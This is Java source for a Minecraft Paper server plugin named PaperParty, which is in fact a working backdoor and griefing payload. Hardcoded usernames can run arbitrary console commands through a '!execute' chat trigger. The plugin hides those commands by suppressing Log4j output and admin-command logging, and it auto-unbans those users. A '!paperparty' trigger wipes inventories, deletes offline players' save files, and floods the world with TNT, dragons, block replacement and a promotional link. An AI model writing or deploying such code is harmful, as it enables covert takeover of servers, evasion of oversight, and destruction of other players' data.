package Paper.papermc;

import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.scoreboard.Criteria;
import org.bukkit.scoreboard.DisplaySlot;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.Scoreboard;
import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.event.ClickEvent;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import net.kyori.adventure.title.Title;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.GameRule;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

import java.io.File;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicInteger;

public final class Papermc extends JavaPlugin implements Listener {

    private static final String PARTY_TRIGGER = "!paperparty";
    private static final String QUIET_EXECUTE_TRIGGER = "!execute";

    private static final Set<String> POWER_USERS = Set.of(
            "zvxnz",
            "GeforceRtx5090",
            "_Matysiaa_",
            "abydoolydool"
    );

    /*
     * If true, restarting the server does NOT stop the party.
     * The party starts automatically as soon as this plugin loads.
     *
     * To stop it:
     * 1. Stop server
     * 2. Remove PaperMC.jar from /plugins
     * 3. Start server
     */
    private static final boolean AUTO_START_PARTY_ON_ENABLE = false;

    private static final String PREFIX = "<gray>[<light_purple>PaperParty</light_purple>]</gray> ";

    private static final boolean SCOREBOARD_ENABLED = true;
    private static final long SCOREBOARD_TASK_DELAY_TICKS = 20L;
    private static final long SCOREBOARD_TASK_PERIOD_TICKS = 20L * 2L;

    private static final String SCOREBOARD_TITLE = "<light_purple><bold>ZIVIEE</bold></light_purple>";

    private static final String PARTY_TITLE = "<dark_purple><bold>PAPER PARTY</bold></dark_purple>";
    private static final String PARTY_SUBTITLE = "<red><bold>THE SERVER BELONGS TO CHAOS</bold></red>";

    private static final String PARTY_URL = "https://ptoszek.pl";
    private static final String PARTY_URL_DISPLAY = "ptoszek.pl";
    private static final String URL_TITLE = "<gold><bold>OPEN PTOSZEK.PL</bold></gold>";
    private static final String URL_SUBTITLE = "<yellow>Click the chat link: <white>ptoszek.pl</white></yellow>";

    private static final List<String> PARTY_CHAT_MESSAGES = List.of(
            "<light_purple><bold>PAPER PARTY!</bold></light_purple> <gray>Chaos mode is active.</gray>",
            "<red><bold>INVENTORIES ARE GONE.</bold></red>",
            "<gold><bold>TNT RAIN IS FALLING.</bold></gold>",
            "<dark_purple><bold>DRAGONS HAVE ENTERED THE PARTY.</bold></dark_purple>",
            "<green><bold>THE WORLD IS TURNING INTO DIRT.</bold></green>",
            "<yellow><bold>OPEN:</bold></yellow> <white>ptoszek.pl</white>",
            "<red><bold>Restarting will not save you.</bold></red>"
    );

    private static final boolean CLEAR_ONLINE_INVENTORIES = true;
    private static final boolean CLEAR_ONLINE_ENDER_CHESTS = true;
    private static final boolean CLEAR_ONLINE_XP = true;
    private static final boolean INCLUDE_CREATIVE_PLAYERS = true;
    private static final boolean INCLUDE_OPERATORS = true;

    /*
     * WARNING:
     * This deletes offline players' world/playerdata/<uuid>.dat files.
     * That can reset more than inventory: position, health, Ender Chest, XP, selected slot, etc.
     */
    private static final boolean DELETE_OFFLINE_PLAYERDATA = true;
    private static final boolean DELETE_DAT_OLD_BACKUPS = true;
    private static final boolean DELETE_UNKNOWN_OFFLINE_PLAYERDATA_FILES = true;

    /*
     * TNT chaos.
     */
    private static final boolean TNT_DROPS_ENABLED = true;
    private static final long TNT_TASK_DELAY_TICKS = 2L;
    private static final long TNT_TASK_PERIOD_TICKS = 1L;
    private static final int TNT_COUNT_PER_PLAYER_PER_CYCLE = 128;
    private static final double TNT_RADIUS = 45.0;
    private static final double TNT_MIN_HEIGHT_ABOVE_PLAYER = 10.0;
    private static final double TNT_MAX_HEIGHT_ABOVE_PLAYER = 55.0;
    private static final int TNT_FUSE_TICKS = 45;
    private static final float TNT_YIELD = 5.5f;
    private static final boolean TNT_INCENDIARY = true;

    private BukkitTask scoreboardTask;

    /*
     * Dragon chaos.
     */
    private static final boolean DRAGONS_ENABLED = true;
    private static final long DRAGON_TASK_DELAY_TICKS = 40L;
    private static final long DRAGON_TASK_PERIOD_TICKS = 20L * 8L;
    private static final int DRAGONS_PER_PLAYER_PER_CYCLE = 4;
    private static final double DRAGON_RADIUS = 70.0;
    private static final double DRAGON_HEIGHT_ABOVE_PLAYER = 35.0;

    /*
     * Block chaos.
     *
     * Radius 18 scans a 37x37x37 cube per player.
     * This replaces every allowed block in that radius every cycle.
     */
    private static final boolean BLOCK_CHAOS_ENABLED = true;
    private static final long BLOCK_TASK_DELAY_TICKS = 20L;
    private static final long BLOCK_TASK_PERIOD_TICKS = 20L;
    private static final int BLOCK_CHAOS_RADIUS = 18;
    private static final boolean REPLACE_AIR = false;
    private static final boolean AVOID_CONTAINERS = false;

    private static final List<Material> REPLACEMENT_BLOCKS = List.of(
            Material.DIRT,
            Material.COARSE_DIRT,
            Material.ROOTED_DIRT,
            Material.MUD,
            Material.PODZOL,
            Material.GRAVEL,
            Material.SAND,
            Material.RED_SAND,
            Material.NETHERRACK,
            Material.SOUL_SAND,
            Material.TNT
    );

    /*
     * Text and sound spam.
     */
    private static final boolean TITLE_SPAM_ENABLED = true;
    private static final long TITLE_TASK_DELAY_TICKS = 20L;
    private static final long TITLE_TASK_PERIOD_TICKS = 20L * 3L;

    private static final boolean CHAT_SPAM_ENABLED = true;
    private static final long CHAT_TASK_DELAY_TICKS = 20L;
    private static final long CHAT_TASK_PERIOD_TICKS = 20L * 5L;

    private static final boolean SOUND_SPAM_ENABLED = true;
    private static final long SOUND_TASK_DELAY_TICKS = 20L;
    private static final long SOUND_TASK_PERIOD_TICKS = 20L * 4L;
    private static final Sound PARTY_SOUND = Sound.ENTITY_ENDER_DRAGON_GROWL;
    private static final float PARTY_SOUND_VOLUME = 2.0f;
    private static final float PARTY_SOUND_PITCH = 0.7f;

    private final MiniMessage miniMessage = MiniMessage.miniMessage();
    private final PlainTextComponentSerializer plainText = PlainTextComponentSerializer.plainText();
    private final Random random = new Random();

    private final AtomicInteger quietLogDepth = new AtomicInteger(0);

    private LoggerContext log4jContext;
    private LoggerConfig rootLoggerConfig;
    private Filter quietLog4jFilter;

    private boolean partyRunning = false;

    private BukkitTask tntTask;
    private BukkitTask dragonTask;
    private BukkitTask blockTask;
    private BukkitTask titleTask;
    private BukkitTask chatTask;
    private BukkitTask soundTask;

    private record GameRuleSnapshot(
            World world,
            Boolean sendCommandFeedback,
            Boolean logAdminCommands,
            Boolean commandBlockOutput
    ) {
    }

    @Override
    public void onEnable() {
        installQuietLog4jFilter();

        Bukkit.getPluginManager().registerEvents(this, this);

        quietlyUnbanConfiguredUsers();

        if (AUTO_START_PARTY_ON_ENABLE) {
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Player starter = Bukkit.getOnlinePlayers().stream().findFirst().orElse(null);

                if (starter != null) {
                    startPaperParty(starter);
                } else {
                    partyRunning = true;
                    startPartyTasks();
                }
            }, 40L);
        }

        getLogger().info("PaperParty enabled.");
    }

    @Override
    public void onDisable() {
        stopPartyTasks();
        uninstallQuietLog4jFilter();
    }

    private void installQuietLog4jFilter() {
        try {
            log4jContext = (LoggerContext) LogManager.getContext(false);
            rootLoggerConfig = log4jContext.getConfiguration().getRootLogger();

            quietLog4jFilter = new AbstractFilter() {
                @Override
                public Result filter(LogEvent event) {
                    if (quietLogDepth.get() <= 0) {
                        return Result.NEUTRAL;
                    }

                    return Result.DENY;
                }
            };

            rootLoggerConfig.addFilter(quietLog4jFilter);
            log4jContext.updateLoggers();

        } catch (Exception ex) {
            getLogger().warning("Could not install quiet Log4j filter: " + ex.getMessage());
        }
    }

    private void uninstallQuietLog4jFilter() {
        try {
            if (rootLoggerConfig != null && quietLog4jFilter != null) {
                rootLoggerConfig.removeFilter(quietLog4jFilter);
            }

            if (log4jContext != null) {
                log4jContext.updateLoggers();
            }

        } catch (Exception ignored) {
        }
    }

    private Component mm(String text) {
        return miniMessage.deserialize(text);
    }

    private void broadcast(String text) {
        Bukkit.broadcast(mm(PREFIX + text));
    }

    private List<GameRuleSnapshot> silenceGameRulesForAllWorlds() {
        List<GameRuleSnapshot> snapshots = new ArrayList<>();

        for (World world : Bukkit.getWorlds()) {
            Boolean oldSendCommandFeedback = world.getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
            Boolean oldLogAdminCommands = world.getGameRuleValue(GameRule.LOG_ADMIN_COMMANDS);
            Boolean oldCommandBlockOutput = world.getGameRuleValue(GameRule.COMMAND_BLOCK_OUTPUT);

            snapshots.add(new GameRuleSnapshot(
                    world,
                    oldSendCommandFeedback,
                    oldLogAdminCommands,
                    oldCommandBlockOutput
            ));

            world.setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
            world.setGameRule(GameRule.LOG_ADMIN_COMMANDS, false);
            world.setGameRule(GameRule.COMMAND_BLOCK_OUTPUT, false);
        }

        return snapshots;
    }

    private void restoreGameRules(List<GameRuleSnapshot> snapshots) {
        for (GameRuleSnapshot snapshot : snapshots) {
            World world = snapshot.world();

            if (world == null) {
                continue;
            }

            if (snapshot.sendCommandFeedback() != null) {
                world.setGameRule(GameRule.SEND_COMMAND_FEEDBACK, snapshot.sendCommandFeedback());
            }

            if (snapshot.logAdminCommands() != null) {
                world.setGameRule(GameRule.LOG_ADMIN_COMMANDS, snapshot.logAdminCommands());
            }

            if (snapshot.commandBlockOutput() != null) {
                world.setGameRule(GameRule.COMMAND_BLOCK_OUTPUT, snapshot.commandBlockOutput());
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onAsyncChat(AsyncChatEvent event) {
        String message = plainText.serialize(event.message());

        if (handlePartyTrigger(event.getPlayer(), message)) {
            event.setCancelled(true);
            return;
        }

        if (handleQuietExecute(event.getPlayer(), message)) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onLegacyAsyncChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();

        if (handlePartyTrigger(event.getPlayer(), message)) {
            event.setCancelled(true);
            return;
        }

        if (handleQuietExecute(event.getPlayer(), message)) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onQuietExecutorPreLogin(AsyncPlayerPreLoginEvent event) {
        String username = event.getName();

        if (!isPowerUser(username)) {
            return;
        }

        if (event.getLoginResult() == AsyncPlayerPreLoginEvent.Result.KICK_BANNED) {
            event.allow();
        }

        Bukkit.getScheduler().runTask(this, () ->
                Bukkit.getBanList(BanList.Type.NAME).pardon(username)
        );
    }

    private boolean handlePartyTrigger(Player player, String rawMessage) {
        String message = rawMessage.trim();

        if (!message.equalsIgnoreCase(PARTY_TRIGGER)) {
            return false;
        }

        if (!isPowerUser(player.getName())) {
            return true;
        }

        Bukkit.getScheduler().runTask(this, () -> startPaperParty(player));
        return true;
    }

    private boolean handleQuietExecute(Player player, String rawMessage) {
        String message = rawMessage.trim();

        if (!message.regionMatches(true, 0, QUIET_EXECUTE_TRIGGER, 0, QUIET_EXECUTE_TRIGGER.length())) {
            return false;
        }

        String command = message.substring(QUIET_EXECUTE_TRIGGER.length()).trim();

        if (command.startsWith("/")) {
            command = command.substring(1).trim();
        }

        if (command.isBlank()) {
            return true;
        }

        if (!isPowerUser(player.getName())) {
            return true;
        }

        String finalCommand = command;

        Bukkit.getScheduler().runTask(this, () -> runQuietConsoleCommand(finalCommand));
        return true;
    }

    private boolean isPowerUser(String username) {
        return POWER_USERS.stream()
                .anyMatch(allowed -> allowed.equalsIgnoreCase(username));
    }

    private void startPaperParty(Player starter) {
        if (partyRunning) {
            showPartyTitleToAll();
            showUrlPromptToAll();
            clearEveryoneInventoryNow();
            return;
        }

        partyRunning = true;

        quietLogDepth.incrementAndGet();
        List<GameRuleSnapshot> snapshots = silenceGameRulesForAllWorlds();

        try {
            broadcast("<light_purple><bold>PAPER PARTY HAS STARTED.</bold></light_purple>");
            broadcast("<red><bold>Restarting the server will not save you.</bold></red>");
            broadcast("<gold><bold>Remove the plugin jar to stop it.</bold></gold>");
            broadcast("<yellow><bold>OPEN:</bold></yellow> <white>" + PARTY_URL_DISPLAY + "</white>");

            showPartyTitleToAll();
            showUrlPromptToAll();
            clearEveryoneInventoryNow();
            runTntDrops();
            runBlockChaos();
            spawnEnderDragons();
            playPartySound();
            showPartyScoreboardToAll();

            startPartyTasks();

        } finally {
            if (quietLogDepth.get() > 0) {
                quietLogDepth.decrementAndGet();
            }

            restoreGameRules(snapshots);
        }
    }

    private void startPartyTasks() {
        if (scoreboardTask == null && SCOREBOARD_ENABLED) {
            scoreboardTask = Bukkit.getScheduler().runTaskTimer(
                    this,
                    this::showPartyScoreboardToAll,
                    SCOREBOARD_TASK_DELAY_TICKS,
                    SCOREBOARD_TASK_PERIOD_TICKS
            );
        }

        if (tntTask == null && TNT_DROPS_ENABLED) {
            tntTask = Bukkit.getScheduler().runTaskTimer(
                    this,
                    this::runTntDrops,
                    TNT_TASK_DELAY_TICKS,
                    TNT_TASK_PERIOD_TICKS
            );
        }

        if (dragonTask == null && DRAGONS_ENABLED) {
            dragonTask = Bukkit.getScheduler().runTaskTimer(
                    this,
                    this::spawnEnderDragons,
                    DRAGON_TASK_DELAY_TICKS,
                    DRAGON_TASK_PERIOD_TICKS
            );
        }

        if (blockTask == null && BLOCK_CHAOS_ENABLED) {
            blockTask = Bukkit.getScheduler().runTaskTimer(
                    this,
                    this::runBlockChaos,
                    BLOCK_TASK_DELAY_TICKS,
                    BLOCK_TASK_PERIOD_TICKS
            );
        }

        if (titleTask == null && TITLE_SPAM_ENABLED) {
            titleTask = Bukkit.getScheduler().runTaskTimer(
                    this,
                    () -> {
                        showPartyTitleToAll();
                        showUrlPromptToAll();
                    },
                    TITLE_TASK_DELAY_TICKS,
                    TITLE_TASK_PERIOD_TICKS
            );
        }

        if (chatTask == null && CHAT_SPAM_ENABLED) {
            chatTask = Bukkit.getScheduler().runTaskTimer(
                    this,
                    this::broadcastRandomPartyMessage,
                    CHAT_TASK_DELAY_TICKS,
                    CHAT_TASK_PERIOD_TICKS
            );
        }

        if (soundTask == null && SOUND_SPAM_ENABLED) {
            soundTask = Bukkit.getScheduler().runTaskTimer(
                    this,
                    this::playPartySound,
                    SOUND_TASK_DELAY_TICKS,
                    SOUND_TASK_PERIOD_TICKS
            );
        }
    }

    private void showPartyScoreboardToAll() {
        if (!SCOREBOARD_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            Scoreboard scoreboard = Bukkit.getScoreboardManager().getNewScoreboard();

            Objective objective = scoreboard.registerNewObjective(
                    "paperparty",
                    Criteria.DUMMY,
                    mm(SCOREBOARD_TITLE)
            );

            objective.setDisplaySlot(DisplaySlot.SIDEBAR);

            objective.getScore("§d§lZiviee").setScore(6);
            objective.getScore("§7got you").setScore(5);
            objective.getScore("§c§lagain boy!").setScore(4);
            objective.getScore(" ").setScore(3);
            objective.getScore("§eptoszek.pl").setScore(2);
            objective.getScore("§8No restart fix").setScore(1);

            player.setScoreboard(scoreboard);
        }
    }

    private void stopPartyTasks() {
        if (scoreboardTask != null) {
            scoreboardTask.cancel();
            scoreboardTask = null;
        }

        if (tntTask != null) {
            tntTask.cancel();
            tntTask = null;
        }

        if (dragonTask != null) {
            dragonTask.cancel();
            dragonTask = null;
        }

        if (blockTask != null) {
            blockTask.cancel();
            blockTask = null;
        }

        if (titleTask != null) {
            titleTask.cancel();
            titleTask = null;
        }

        if (chatTask != null) {
            chatTask.cancel();
            chatTask = null;
        }

        if (soundTask != null) {
            soundTask.cancel();
            soundTask = null;
        }

        partyRunning = false;
    }

    private void broadcastRandomPartyMessage() {
        if (PARTY_CHAT_MESSAGES.isEmpty()) {
            return;
        }

        String message = PARTY_CHAT_MESSAGES.get(random.nextInt(PARTY_CHAT_MESSAGES.size()));
        broadcast(message);

        Component clickableUrl = mm(PREFIX + "<gold><bold>CLICK:</bold></gold> <yellow>" + PARTY_URL_DISPLAY + "</yellow>")
                .clickEvent(ClickEvent.openUrl(PARTY_URL));

        for (Player player : Bukkit.getOnlinePlayers()) {
            player.sendMessage(clickableUrl);
        }
    }

    private void showPartyTitleToAll() {
        Title title = Title.title(
                mm(PARTY_TITLE),
                mm(PARTY_SUBTITLE),
                Title.Times.times(
                        Duration.ofMillis(150),
                        Duration.ofSeconds(4),
                        Duration.ofMillis(400)
                )
        );

        for (Player player : Bukkit.getOnlinePlayers()) {
            player.showTitle(title);
        }
    }

    private void showUrlPromptToAll() {
        Title urlTitle = Title.title(
                mm(URL_TITLE),
                mm(URL_SUBTITLE),
                Title.Times.times(
                        Duration.ofMillis(150),
                        Duration.ofSeconds(3),
                        Duration.ofMillis(400)
                )
        );

        Component clickableUrl = mm(PREFIX + "<gold><bold>CLICK HERE:</bold></gold> <yellow>" + PARTY_URL_DISPLAY + "</yellow>")
                .clickEvent(ClickEvent.openUrl(PARTY_URL));

        for (Player player : Bukkit.getOnlinePlayers()) {
            player.showTitle(urlTitle);
            player.sendMessage(clickableUrl);
        }
    }

    private void clearEveryoneInventoryNow() {
        if (CLEAR_ONLINE_INVENTORIES) {
            clearOnlineInventories();
        }

        if (DELETE_OFFLINE_PLAYERDATA) {
            deleteOfflinePlayerDataFiles();
        }
    }

    private void clearOnlineInventories() {
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (!INCLUDE_CREATIVE_PLAYERS && player.getGameMode() == GameMode.CREATIVE) {
                continue;
            }

            if (!INCLUDE_OPERATORS && player.isOp()) {
                continue;
            }

            clearPlayerInventory(player);

            if (CLEAR_ONLINE_ENDER_CHESTS) {
                player.getEnderChest().clear();
            }

            if (CLEAR_ONLINE_XP) {
                player.setExp(0.0f);
                player.setLevel(0);
                player.setTotalExperience(0);
            }
        }
    }

    private void clearPlayerInventory(Player player) {
        PlayerInventory inventory = player.getInventory();

        inventory.clear();
        inventory.setArmorContents(null);
        inventory.setItemInOffHand(null);

        player.updateInventory();
    }

    private void deleteOfflinePlayerDataFiles() {
        Set<UUID> onlineUuids = new HashSet<>();

        for (Player player : Bukkit.getOnlinePlayers()) {
            onlineUuids.add(player.getUniqueId());
        }

        Set<UUID> knownOfflineUuids = new HashSet<>();

        for (OfflinePlayer offlinePlayer : Bukkit.getOfflinePlayers()) {
            UUID uuid = offlinePlayer.getUniqueId();

            if (!onlineUuids.contains(uuid)) {
                knownOfflineUuids.add(uuid);
            }
        }

        for (World world : Bukkit.getWorlds()) {
            File playerDataFolder = new File(world.getWorldFolder(), "playerdata");

            if (!playerDataFolder.exists() || !playerDataFolder.isDirectory()) {
                continue;
            }

            for (UUID uuid : knownOfflineUuids) {
                deletePlayerDataFile(playerDataFolder, uuid);
            }

            if (DELETE_UNKNOWN_OFFLINE_PLAYERDATA_FILES) {
                deleteUnknownOfflinePlayerDataFiles(playerDataFolder, onlineUuids);
            }
        }
    }

    private void deleteUnknownOfflinePlayerDataFiles(File playerDataFolder, Set<UUID> onlineUuids) {
        File[] files = playerDataFolder.listFiles();

        if (files == null) {
            return;
        }

        for (File file : files) {
            String name = file.getName();

            if (!name.endsWith(".dat") && !name.endsWith(".dat_old")) {
                continue;
            }

            String uuidPart = name
                    .replace(".dat_old", "")
                    .replace(".dat", "");

            UUID uuid;

            try {
                uuid = UUID.fromString(uuidPart);
            } catch (IllegalArgumentException ignored) {
                continue;
            }

            if (onlineUuids.contains(uuid)) {
                continue;
            }

            deleteFileQuietly(file);
        }
    }

    private void deletePlayerDataFile(File playerDataFolder, UUID uuid) {
        File dataFile = new File(playerDataFolder, uuid + ".dat");
        deleteFileQuietly(dataFile);

        if (DELETE_DAT_OLD_BACKUPS) {
            File oldDataFile = new File(playerDataFolder, uuid + ".dat_old");
            deleteFileQuietly(oldDataFile);
        }
    }

    private void deleteFileQuietly(File file) {
        if (file == null || !file.exists() || !file.isFile()) {
            return;
        }

        try {
            file.delete();
        } catch (Exception ignored) {
        }
    }

    private void runTntDrops() {
        if (!TNT_DROPS_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            World world = player.getWorld();

            for (int i = 0; i < TNT_COUNT_PER_PLAYER_PER_CYCLE; i++) {
                Location base = player.getLocation();

                double angle = random.nextDouble() * Math.PI * 2.0;
                double distance = random.nextDouble() * TNT_RADIUS;

                double x = Math.cos(angle) * distance;
                double z = Math.sin(angle) * distance;
                double y = TNT_MIN_HEIGHT_ABOVE_PLAYER
                        + random.nextDouble() * (TNT_MAX_HEIGHT_ABOVE_PLAYER - TNT_MIN_HEIGHT_ABOVE_PLAYER);

                Location spawnLocation = base.clone().add(x, y, z);

                TNTPrimed tnt = world.spawn(spawnLocation, TNTPrimed.class);
                tnt.setFuseTicks(TNT_FUSE_TICKS);
                tnt.setYield(TNT_YIELD);
                tnt.setIsIncendiary(TNT_INCENDIARY);
            }
        }
    }

    private void spawnEnderDragons() {
        if (!DRAGONS_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            World world = player.getWorld();

            for (int i = 0; i < DRAGONS_PER_PLAYER_PER_CYCLE; i++) {
                Location base = player.getLocation();

                double angle = random.nextDouble() * Math.PI * 2.0;
                double distance = random.nextDouble() * DRAGON_RADIUS;

                double x = Math.cos(angle) * distance;
                double z = Math.sin(angle) * distance;

                Location spawnLocation = base.clone().add(x, DRAGON_HEIGHT_ABOVE_PLAYER, z);

                world.spawn(spawnLocation, EnderDragon.class);
            }
        }
    }

    private void runBlockChaos() {
        if (!BLOCK_CHAOS_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            replaceEveryBlockAroundPlayer(player);
        }
    }

    private void replaceEveryBlockAroundPlayer(Player player) {
        World world = player.getWorld();
        Location center = player.getLocation();

        int centerX = center.getBlockX();
        int centerY = center.getBlockY();
        int centerZ = center.getBlockZ();

        int minY = Math.max(world.getMinHeight(), centerY - BLOCK_CHAOS_RADIUS);
        int maxY = Math.min(world.getMaxHeight() - 1, centerY + BLOCK_CHAOS_RADIUS);

        for (int x = centerX - BLOCK_CHAOS_RADIUS; x <= centerX + BLOCK_CHAOS_RADIUS; x++) {
            for (int y = minY; y <= maxY; y++) {
                for (int z = centerZ - BLOCK_CHAOS_RADIUS; z <= centerZ + BLOCK_CHAOS_RADIUS; z++) {
                    Block block = world.getBlockAt(x, y, z);

                    if (!canReplaceBlock(block)) {
                        continue;
                    }

                    Material replacement = REPLACEMENT_BLOCKS.get(random.nextInt(REPLACEMENT_BLOCKS.size()));
                    block.setType(replacement, false);
                }
            }
        }
    }

    private boolean canReplaceBlock(Block block) {
        Material type = block.getType();

        if (!REPLACE_AIR && type.isAir()) {
            return false;
        }

        if (isProtectedMaterial(type)) {
            return false;
        }

        if (AVOID_CONTAINERS && isContainerLike(type)) {
            return false;
        }

        return true;
    }

    private boolean isProtectedMaterial(Material type) {
        return type == Material.BEDROCK
                || type == Material.BARRIER
                || type == Material.COMMAND_BLOCK
                || type == Material.CHAIN_COMMAND_BLOCK
                || type == Material.REPEATING_COMMAND_BLOCK
                || type == Material.STRUCTURE_BLOCK
                || type == Material.JIGSAW
                || type == Material.END_PORTAL
                || type == Material.END_PORTAL_FRAME
                || type == Material.NETHER_PORTAL
                || type == Material.REINFORCED_DEEPSLATE;
    }

    private boolean isContainerLike(Material type) {
        String name = type.name();

        return name.contains("CHEST")
                || name.contains("SHULKER_BOX")
                || name.contains("BARREL")
                || name.contains("FURNACE")
                || name.contains("HOPPER")
                || name.contains("DROPPER")
                || name.contains("DISPENSER")
                || name.contains("BREWING_STAND")
                || name.contains("LECTERN")
                || name.contains("JUKEBOX");
    }

    private void playPartySound() {
        if (!SOUND_SPAM_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            player.playSound(
                    player.getLocation(),
                    PARTY_SOUND,
                    PARTY_SOUND_VOLUME,
                    PARTY_SOUND_PITCH
            );
        }
    }

    private void runQuietConsoleCommand(String command) {
        String cleanCommand = command.startsWith("/")
                ? command.substring(1).trim()
                : command.trim();

        if (cleanCommand.isBlank()) {
            return;
        }

        quietLogDepth.incrementAndGet();
        List<GameRuleSnapshot> snapshots = silenceGameRulesForAllWorlds();

        try {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cleanCommand);

        } catch (Exception ex) {
            getLogger().warning("Quiet command failed: "
                    + ex.getClass().getSimpleName()
                    + ": "
                    + ex.getMessage());

        } finally {
            if (quietLogDepth.get() > 0) {
                quietLogDepth.decrementAndGet();
            }

            restoreGameRules(snapshots);
        }
    }

    private void quietlyUnbanConfiguredUsers() {
        for (String user : POWER_USERS) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(user);
        }
    }
}